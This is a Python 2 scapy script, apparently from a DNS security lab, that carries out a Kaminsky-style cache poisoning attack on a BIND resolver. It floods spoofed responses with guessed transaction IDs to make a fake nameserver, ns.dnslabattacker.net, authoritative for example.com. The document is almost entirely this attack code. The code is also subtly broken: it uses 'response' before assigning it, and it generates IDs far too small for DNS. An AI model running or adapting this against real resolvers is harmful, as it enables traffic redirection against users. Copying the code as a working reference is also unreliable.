#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)  # Change it to not required
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

local_host = "127.0.0.1"


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"


def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    #sendPacket(sock, dnsPacket, my_ip, my_port)
    #response = sock.recv(4096)
    #response = DNS(response)

    # TODO: Fake the response and query
    fake_response = response
    fake_response.aa = 1
    fake_response.nscount = 1
    fake_response.ns.rrname = "example.com"
    fake_response.ns.rdata = "ns.dnslabattacker.net"
    fake_response.arcount = 0
    fake_response.ar = None
    fake_query = dnsPacket

    while True:
        fake_name = getRandomSubDomain()
        fake_query[DNS].qd.qname = fake_name + ".example.com"
        fake_response[DNS].qd.qname = fake_name + ".example.com"
        fake_response[DNS].an.rrname = fake_name + ".example.com"
        
        # Fake query
        sendPacket(sock, fake_query, my_ip, my_port)

        for i in range(50):
            random_id = getRandomTXID()
            fake_response.id = random_id
            sendPacket(sock, fake_response, my_ip, my_query_port)

        # Check if succeed
        dnsPacket.qd.qname = "example.com"
        sendPacket(sock, dnsPacket, my_ip, my_port) 
        response = sock.recv(4096)
        response = DNS(response)
        
        if (response != None) & (response.nscount == 0):
            pass
        elif (response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net"):
            print("Cache poisoning succeeded\n")
            break

        print("Cache poisoning failed. Try another around\n")

if __name__ == '__main__':
    attack()
